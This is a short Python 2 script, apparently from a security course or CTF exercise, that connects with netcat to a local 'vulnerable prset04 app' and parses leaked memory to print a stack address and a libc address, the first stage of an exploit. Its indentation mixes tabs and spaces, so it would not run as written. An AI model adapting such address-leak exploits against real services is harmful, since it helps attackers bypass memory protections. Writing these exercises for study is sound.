from os import kill
from signal import alarm, signal, SIGALRM, SIGKILL
from subprocess import PIPE, Popen

import struct, subprocess
import binascii

import argparse


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-p','--port',required=True, help='Specify port to scan vulnerable prset04 app')
	args = parser.parse_args()



def run(args, cwd = None, shell = False, kill_tree = True, timeout = -1, env = None):
    '''
    Run a command with a timeout after which it will be forcibly
    killed.
    '''
    class Alarm(Exception):
        pass
    def alarm_handler(signum, frame):
        raise Alarm
    p = Popen(args, shell = shell, cwd = cwd, stdout = PIPE,stdin=PIPE, stderr = PIPE, env = env)
    if timeout != -1:
        signal(SIGALRM, alarm_handler)
        alarm(timeout)
    try:
        stdout, stderr = p.communicate()
        if timeout != -1:
            alarm(0)
    except Alarm:
        pids = [p.pid]
        if kill_tree:
            pids.extend(get_process_children(p.pid))
        for pid in pids:
            # process might have died before getting to this line
            # so wrap to avoid OSError: no such process
            try: 
                kill(pid, SIGKILL)
            except OSError:
                pass
        return -9, '', ''
    return p.returncode, stdout, stderr

def get_process_children(pid):
    p = Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True,
              stdout = PIPE, stderr = PIPE)
    stdout, stderr = p.communicate()
    return [int(p) for p in stdout.split()]


offset=0
def read_one(buffer):
	global offset
        buffer = buffer[offset:offset+8]
        buffer = buffer[::-1]
        hexlify_buffer = binascii.hexlify(buffer)
	offset += 8
        return hexlify_buffer

stack = None
libc = None

def exploit(port):
        global stack, libc
        #proc = subprocess.Popen('echo 7777777 | nc localhost {0}'.format(port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	proc = run('echo 7777777 | nc localhost {0}'.format(port), shell = True)[1]
	read_one(proc) # 0x1
        read_one(proc) # no need
        stack = read_one(proc) # stack
        read_one(proc)
        libc =  read_one(proc) # libc
       

if __name__ == '__main__':
	exploit(args.port)
	print stack
        print libc

